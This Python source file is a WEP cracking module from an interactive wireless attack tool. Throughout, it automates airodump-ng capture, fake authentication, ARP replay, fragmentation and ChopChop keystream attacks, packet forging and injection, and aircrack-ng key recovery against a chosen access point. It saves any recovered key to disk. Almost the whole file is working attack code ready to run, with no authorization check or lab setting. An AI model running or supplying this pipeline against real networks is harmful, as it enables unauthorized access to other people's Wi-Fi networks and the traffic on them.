#!/usr/bin/env python3
"""
WEP cracking module.

Attack pipeline
──────────────
 1. Focus airodump-ng on target (BSSID + channel) → capture IVs to .cap
 2. Fake authentication with the AP   (aireplay-ng -1)
 3. ARP replay attack                 (aireplay-ng -3)  ← primary IV accelerator
    • If ARP traffic is absent after ARP_WAIT seconds →
      fragmentation attack            (aireplay-ng -5)  ← generates keystream
      then craft + inject ARP via packetforge-ng
 4. ChopChop fallback                 (aireplay-ng -4)  ← manual option
 5. Periodic aircrack-ng (PTW + FMS/KoreK) every IV_CRACK_INTERVAL new IVs
 6. KEY FOUND → stop all processes, display + save key

WEP key lengths supported: 64-bit (40-bit key) and 128-bit (104-bit key).
aircrack-ng auto-detects; we try both if needed.
"""

import os
import re
import time
import subprocess
import threading
from datetime import datetime

from modules.banner import C, info, success, warn, error, found, print_section

CAPTURE_DIR        = 'captures'
RESULTS_DIR        = 'results'
os.makedirs(CAPTURE_DIR, exist_ok=True)
os.makedirs(RESULTS_DIR, exist_ok=True)

IV_FIRST_CRACK     = 10_000   # don't attempt crack until this many IVs
IV_CRACK_INTERVAL  =  5_000   # re-attempt every N new IVs
IV_GIVEUP          = 150_000  # abandon after this many IVs without success
ARP_WAIT           =     45   # seconds without IV increase before fallback
FAKE_AUTH_DELAY    =      6   # seconds between fake-auth keepalives
POLL_INTERVAL      =      4   # main loop sleep


# ─────────────────────────────────────────────────────────────────────────────
# Public entry point
# ─────────────────────────────────────────────────────────────────────────────

def wep_crack_menu(interface: str, target: dict) -> str | None:
    """
    Interactive menu for WEP cracking.
    Returns the cracked WEP key string, or None.
    """
    print_section("WEP Cracker")

    enc = target.get('privacy', '') + target.get('cipher', '')
    if 'WEP' not in enc.upper() and 'WEP' not in target.get('privacy', '').upper():
        warn("Selected target does not appear to be WEP-encrypted.")
        c = input(f"  {C.YELLOW}Continue anyway? [y/N]: {C.RESET}").strip().lower()
        if c != 'y':
            return None

    info(f"Target  : {target['ssid']}  [{target['bssid']}]  CH{target['channel']}")
    info(f"Privacy : {target.get('privacy', 'WEP')}")
    print(f"""
  {C.WHITE}Attack Mode:{C.RESET}
  {C.GREEN}[1]{C.RESET} Auto  – Fake Auth + ARP Replay  {C.YELLOW}(recommended){C.RESET}
  {C.GREEN}[2]{C.RESET} Auto  – Fake Auth + Fragmentation (no clients needed)
  {C.GREEN}[3]{C.RESET} Auto  – ChopChop attack
  {C.GREEN}[4]{C.RESET} Crack existing .cap file only   (already have IVs)
  {C.RED}[0]{C.RESET} Back
""")

    mode = input(f"  {C.YELLOW}Mode: {C.RESET}").strip()
    if mode == '0':
        return None

    bssid   = target['bssid']
    channel = target['channel']
    essid   = target['ssid']
    stamp   = datetime.now().strftime('%Y%m%d_%H%M%S')
    cap_base = os.path.join(CAPTURE_DIR, f'wep_{essid.replace(" ","_")}_{stamp}')

    if mode == '1':
        return _pipeline_arp_replay(interface, bssid, channel, essid, cap_base)
    elif mode == '2':
        return _pipeline_fragmentation(interface, bssid, channel, essid, cap_base)
    elif mode == '3':
        return _pipeline_chopchop(interface, bssid, channel, essid, cap_base)
    elif mode == '4':
        cap_path = input(f"  {C.YELLOW}Path to .cap file: {C.RESET}").strip()
        if not os.path.exists(cap_path):
            error(f"File not found: {cap_path}")
            return None
        return _crack_loop(cap_path, 0)
    else:
        error("Invalid mode.")
        return None


# ─────────────────────────────────────────────────────────────────────────────
# Attack pipelines
# ─────────────────────────────────────────────────────────────────────────────

def _pipeline_arp_replay(interface, bssid, channel, essid, cap_base) -> str | None:
    """
    Classic WEP attack:
      fake-auth → ARP replay → collect IVs → crack
    If ARP replay stalls, offer fragmentation fallback.
    """
    our_mac = _get_interface_mac(interface)
    if not our_mac:
        error("Could not determine interface MAC address.")
        return None

    info(f"Interface MAC: {our_mac}")

    cap_file = cap_base + '-01.cap'
    dump_proc = _start_airodump_wep(interface, bssid, channel, cap_base)
    time.sleep(2)

    # Step 1: Fake auth
    info("Step 1/3: Fake authentication...")
    auth_ok = _fake_auth(interface, bssid, essid, our_mac)
    if not auth_ok:
        warn("Fake auth may have failed (AP might have MAC filtering).")
        warn("Continuing anyway — ARP replay might still work.")

    # Step 2: ARP replay in background
    info("Step 2/3: Starting ARP replay (waiting for first ARP packet)...")
    arp_proc = _start_arp_replay(interface, bssid, our_mac)

    # Step 3: Monitor IVs + periodic crack
    info("Step 3/3: Collecting IVs and cracking...")
    key = _iv_monitor_loop(cap_base, cap_file, arp_proc, bssid)

    # Cleanup
    _kill(arp_proc)
    _kill(dump_proc)

    if key:
        _save_wep_result(bssid, essid, key)
        found(f"WEP KEY FOUND!  →  {key}")
        return key
    else:
        # Offer fragmentation fallback
        warn("ARP replay did not yield enough IVs or crack failed.")
        c = input(f"  {C.YELLOW}Try fragmentation attack as fallback? [y/N]: {C.RESET}").strip().lower()
        if c == 'y':
            return _pipeline_fragmentation(interface, bssid, channel, essid, cap_base + '_frag')
        return None


def _pipeline_fragmentation(interface, bssid, channel, essid, cap_base) -> str | None:
    """
    Fragmentation attack:
      fake-auth → fragment attack → get keystream (.xor) →
      craft ARP with packetforge-ng → inject ARP → collect IVs → crack
    """
    our_mac = _get_interface_mac(interface)
    if not our_mac:
        error("Could not determine interface MAC address.")
        return None

    cap_file = cap_base + '-01.cap'
    xor_file = cap_base + '.xor'

    dump_proc = _start_airodump_wep(interface, bssid, channel, cap_base)
    time.sleep(2)

    info("Fake authentication...")
    _fake_auth(interface, bssid, essid, our_mac)

    info("Running fragmentation attack (aireplay-ng -5)...")
    info("This captures a packet and extracts a keystream fragment (.xor file).")
    warn("You may need to press 'y' if prompted by aireplay-ng.")

    frag_proc = subprocess.Popen(
        ['aireplay-ng', '-5', '-b', bssid, '-h', our_mac, interface],
        stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        text=True, bufsize=1,
    )

    # Feed 'y' to any yes/no prompts
    output_lines = []
    try:
        for line in frag_proc.stdout:
            l = line.strip()
            output_lines.append(l)
            print(f"    {C.DIM}{l}{C.RESET}")
            if '?' in l or 'use it' in l.lower():
                frag_proc.stdin.write('y\n')
                frag_proc.stdin.flush()
            # Detect .xor file creation
            if 'Saving keystream' in l or '.xor' in l:
                # Extract xor filename from line if present
                m = re.search(r'(\S+\.xor)', l)
                if m:
                    xor_file = m.group(1)
                    break
        frag_proc.wait(timeout=60)
    except (subprocess.TimeoutExpired, Exception):
        frag_proc.terminate()

    # Look for any .xor file created in cwd
    if not os.path.exists(xor_file):
        for f in os.listdir('.'):
            if f.endswith('.xor'):
                xor_file = f
                break

    if not os.path.exists(xor_file):
        error("Fragmentation attack did not produce a .xor keystream file.")
        _kill(dump_proc)
        return None

    success(f"Keystream saved: {xor_file}")

    # Check if packetforge-ng is available
    if not _has_tool('packetforge-ng'):
        warn("packetforge-ng not found — cannot craft ARP packet.")
        warn("Install aircrack-ng suite fully: apt install aircrack-ng")
        _kill(dump_proc)
        return None

    # Craft ARP request with packetforge-ng
    arp_file = cap_base + '_arp.cap'
    info("Crafting ARP packet with packetforge-ng...")
    pg_cmd = [
        'packetforge-ng', '-0',
        '-a', bssid,
        '-h', our_mac,
        '-k', '255.255.255.255',
        '-l', '255.255.255.255',
        '-y', xor_file,
        '-w', arp_file,
    ]
    r = subprocess.run(pg_cmd, capture_output=True, text=True)
    if r.returncode != 0 or not os.path.exists(arp_file):
        error(f"packetforge-ng failed: {r.stderr}")
        _kill(dump_proc)
        return None

    success(f"Crafted ARP packet: {arp_file}")

    # Inject crafted ARP packet
    info("Injecting crafted ARP (aireplay-ng -2)...")
    inj_proc = subprocess.Popen(
        ['aireplay-ng', '-2', '-r', arp_file, interface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )

    key = _iv_monitor_loop(cap_base, cap_file, inj_proc, bssid)
    _kill(inj_proc)
    _kill(dump_proc)

    if key:
        _save_wep_result(bssid, essid, key)
        found(f"WEP KEY FOUND!  →  {key}")
        return key

    error("Fragmentation pipeline: key not found.")
    return None


def _pipeline_chopchop(interface, bssid, channel, essid, cap_base) -> str | None:
    """
    ChopChop attack:
      fake-auth → chopchop → decrypt a frame → craft + inject ARP →
      collect IVs → crack
    """
    our_mac = _get_interface_mac(interface)
    if not our_mac:
        error("Could not determine interface MAC address.")
        return None

    cap_file = cap_base + '-01.cap'
    dump_proc = _start_airodump_wep(interface, bssid, channel, cap_base)
    time.sleep(2)

    info("Fake authentication...")
    _fake_auth(interface, bssid, essid, our_mac)

    info("Running ChopChop attack (aireplay-ng -4)...")
    warn("You may need to press 'y' when aireplay-ng asks about a packet.")

    chop_proc = subprocess.Popen(
        ['aireplay-ng', '-4', '-b', bssid, '-h', our_mac, interface],
        stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        text=True, bufsize=1,
    )

    xor_file = None
    try:
        for line in chop_proc.stdout:
            l = line.strip()
            print(f"    {C.DIM}{l}{C.RESET}")
            if '?' in l or 'use this packet' in l.lower():
                chop_proc.stdin.write('y\n')
                chop_proc.stdin.flush()
            m = re.search(r'Saving chosen packet in (\S+)', l)
            if m:
                pass
            if 'Saving keystream' in l or '.xor' in l:
                m2 = re.search(r'(\S+\.xor)', l)
                if m2:
                    xor_file = m2.group(1)
                    break
        chop_proc.wait(timeout=120)
    except (subprocess.TimeoutExpired, Exception):
        chop_proc.terminate()

    # Scan cwd for .xor
    if not xor_file:
        for f in os.listdir('.'):
            if f.endswith('.xor'):
                xor_file = f
                break

    if not xor_file or not os.path.exists(xor_file):
        error("ChopChop did not produce a keystream file.")
        _kill(dump_proc)
        return None

    success(f"Keystream from ChopChop: {xor_file}")

    if not _has_tool('packetforge-ng'):
        warn("packetforge-ng not found — cannot proceed.")
        _kill(dump_proc)
        return None

    arp_file = cap_base + '_chop_arp.cap'
    pg_cmd = [
        'packetforge-ng', '-0',
        '-a', bssid,
        '-h', our_mac,
        '-k', '255.255.255.255',
        '-l', '255.255.255.255',
        '-y', xor_file,
        '-w', arp_file,
    ]
    subprocess.run(pg_cmd, capture_output=True)

    if not os.path.exists(arp_file):
        error("Could not craft ARP packet.")
        _kill(dump_proc)
        return None

    info("Injecting ARP (aireplay-ng -2)...")
    inj_proc = subprocess.Popen(
        ['aireplay-ng', '-2', '-r', arp_file, interface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )

    key = _iv_monitor_loop(cap_base, cap_file, inj_proc, bssid)
    _kill(inj_proc)
    _kill(dump_proc)

    if key:
        _save_wep_result(bssid, essid, key)
        found(f"WEP KEY FOUND!  →  {key}")
        return key

    error("ChopChop pipeline: key not found.")
    return None


# ─────────────────────────────────────────────────────────────────────────────
# IV monitoring + crack loop
# ─────────────────────────────────────────────────────────────────────────────

def _iv_monitor_loop(cap_base: str, cap_file: str, inject_proc, bssid: str) -> str | None:
    """
    Poll IV count from airodump-ng CSV.  Attempt aircrack-ng periodically.
    Returns key string if found, None otherwise.
    """
    csv_file       = cap_base + '-01.csv'
    last_crack_ivs = 0
    last_iv_time   = time.time()
    last_iv_count  = 0
    stall_warned   = False

    info(f"Monitoring IVs...  (target: {IV_FIRST_CRACK:,} before first crack attempt)")
    print()

    while True:
        time.sleep(POLL_INTERVAL)
        iv_count = _get_iv_count(csv_file, bssid)

        # Progress bar
        bar_max    = 50
        fill       = min(int(bar_max * iv_count / IV_FIRST_CRACK), bar_max)
        bar        = f"{C.GREEN}{'█' * fill}{C.DIM}{'░' * (bar_max - fill)}{C.RESET}"
        print(f"\r  IVs: {C.CYAN}{iv_count:>7,}{C.RESET}  [{bar}]  "
              f"next crack @ {C.YELLOW}{max(IV_FIRST_CRACK, last_crack_ivs + IV_CRACK_INTERVAL):,}{C.RESET}   ",
              end='', flush=True)

        # Detect stall (IVs not increasing)
        if iv_count > last_iv_count:
            last_iv_time  = time.time()
            last_iv_count = iv_count
            stall_warned  = False
        elif time.time() - last_iv_time > ARP_WAIT and not stall_warned:
            print()
            warn(f"IV count not increasing for {ARP_WAIT}s. Injection may be stalled.")
            warn("Possible reasons: AP has no associated clients, MAC filtering, or adapter issue.")
            stall_warned = True

        # Attempt crack
        if iv_count >= IV_FIRST_CRACK and (iv_count - last_crack_ivs) >= IV_CRACK_INTERVAL:
            last_crack_ivs = iv_count
            print()
            info(f"Attempting crack with {iv_count:,} IVs...")
            key = _crack_wep_attempt(cap_file)
            if key:
                return key
            info("Not enough IVs yet — collecting more...")
            print()

        # Give up threshold
        if iv_count >= IV_GIVEUP:
            print()
            error(f"Reached {IV_GIVEUP:,} IVs without cracking. Key may be unusually long or data is corrupt.")
            return None

        # Check if injection process died
        if inject_proc and inject_proc.poll() is not None:
            print()
            warn("Injection process terminated. Attempting final crack...")
            return _crack_wep_attempt(cap_file)


# ─────────────────────────────────────────────────────────────────────────────
# aircrack-ng WEP crack
# ─────────────────────────────────────────────────────────────────────────────

def _crack_wep_attempt(cap_file: str) -> str | None:
    """
    Try aircrack-ng with both 64-bit and 128-bit key lengths.
    Returns key string or None.
    """
    if not os.path.exists(cap_file) or os.path.getsize(cap_file) == 0:
        return None

    for key_bits in ['64', '128']:
        try:
            result = subprocess.run(
                ['aircrack-ng', '-n', key_bits, cap_file],
                capture_output=True, text=True, timeout=90,
            )
            key = _parse_wep_key(result.stdout + result.stderr)
            if key:
                return key
        except subprocess.TimeoutExpired:
            warn(f"aircrack-ng timed out for {key_bits}-bit attempt.")

    return None


def _parse_wep_key(output: str) -> str | None:
    """
    Parse aircrack-ng output for WEP key.

    Sample output lines:
      KEY FOUND! [ AB:CD:EF:01:23 ] (ASCII: hello )
      KEY FOUND! [ AB:CD:EF:01:23 ]
    """
    # Hex form
    m = re.search(
        r'KEY FOUND!\s*\[\s*((?:[0-9A-Fa-f]{2}:?)+)\s*\](?:\s*\(ASCII:\s*(.+?)\s*\))?',
        output, re.IGNORECASE
    )
    if m:
        hex_key   = m.group(1).strip()
        ascii_key = m.group(2).strip() if m.group(2) else ''
        if ascii_key:
            return f"{ascii_key}  (hex: {hex_key})"
        return hex_key

    return None


# ─────────────────────────────────────────────────────────────────────────────
# airodump-ng / aireplay-ng wrappers
# ─────────────────────────────────────────────────────────────────────────────

def _start_airodump_wep(interface, bssid, channel, cap_base) -> subprocess.Popen:
    """Start airodump-ng capturing IVs from a specific WEP AP."""
    cmd = [
        'airodump-ng',
        '--bssid',          bssid,
        '--channel',        str(channel),
        '--write',          cap_base,
        '--output-format',  'cap,csv',
        '--write-interval', '2',
        '--ivs',            # append-only IV file for faster cracking (also writes .cap)
        interface,
    ]
    # Note: --ivs creates an .ivs file alongside the .cap; both are valid for aircrack-ng
    return subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def _fake_auth(interface, bssid, essid, our_mac) -> bool:
    """
    Perform fake open-system authentication with the AP.
    aireplay-ng -1 <delay> -e <ESSID> -a <BSSID> -h <MAC> <iface>
    Runs briefly; returns True if it reports success.
    """
    cmd = [
        'aireplay-ng',
        '-1', str(FAKE_AUTH_DELAY),
        '-e', essid,
        '-a', bssid,
        '-h', our_mac,
        interface,
    ]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
        output = r.stdout + r.stderr
        success_patterns = ['Association successful', 'ap_send_assoc_req', 'Sending Authentication']
        if any(p in output for p in success_patterns):
            success("Fake auth: associated with AP.")
            return True
        if 'Got a deauthentication packet' in output:
            warn("AP sent deauth — possible MAC filtering or distance issue.")
        return False
    except subprocess.TimeoutExpired:
        return False


def _start_arp_replay(interface, bssid, our_mac) -> subprocess.Popen:
    """
    Start ARP replay attack in background.
    Waits for an ARP packet from/to the AP and rebroadcasts it to generate IVs.
    """
    cmd = [
        'aireplay-ng',
        '-3',
        '-b', bssid,
        '-h', our_mac,
        interface,
    ]
    return subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────

def _get_iv_count(csv_file: str, bssid: str) -> int:
    """
    Parse airodump-ng CSV to extract the current IV count for a specific BSSID.
    CSV AP columns: BSSID(0), …, # IV(10), …
    """
    if not os.path.exists(csv_file):
        return 0
    try:
        with open(csv_file, 'r', errors='replace') as f:
            in_ap = False
            for line in f:
                stripped = line.strip()
                if stripped.startswith('BSSID') and 'First time' in stripped:
                    in_ap = True
                    continue
                if stripped.startswith('Station MAC'):
                    break
                if not in_ap or not stripped:
                    continue
                parts = [p.strip() for p in stripped.split(',')]
                if len(parts) > 10 and parts[0].upper() == bssid.upper():
                    try:
                        return int(parts[10])
                    except ValueError:
                        pass
    except OSError:
        pass
    return 0


def _get_interface_mac(interface: str) -> str | None:
    """Return the MAC address of `interface` using ip-link."""
    try:
        r = subprocess.run(['ip', 'link', 'show', interface],
                           capture_output=True, text=True)
        m = re.search(r'link/ether\s+([0-9a-fA-F:]{17})', r.stdout)
        if m:
            return m.group(1).upper()
    except FileNotFoundError:
        pass
    # Fallback: iwconfig
    try:
        r = subprocess.run(['iwconfig', interface], capture_output=True, text=True)
        for line in r.stdout.splitlines():
            m = re.search(r'(\w+)\s+Access Point:\s+([0-9A-Fa-f:]{17})', line)
            if m:
                return m.group(2).upper()
    except FileNotFoundError:
        pass
    return None


def _has_tool(name: str) -> bool:
    import shutil
    return shutil.which(name) is not None


def _kill(proc):
    if proc and proc.poll() is None:
        try:
            proc.terminate()
            proc.wait(timeout=5)
        except Exception:
            try:
                proc.kill()
            except Exception:
                pass


def _save_wep_result(bssid: str, essid: str, key: str):
    stamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    path  = os.path.join(RESULTS_DIR, f'wep_result_{stamp}.txt')
    with open(path, 'w') as f:
        f.write(f"Timestamp : {datetime.now()}\n")
        f.write(f"ESSID     : {essid}\n")
        f.write(f"BSSID     : {bssid}\n")
        f.write(f"WEP Key   : {key}\n")
    success(f"Result saved → {path}")
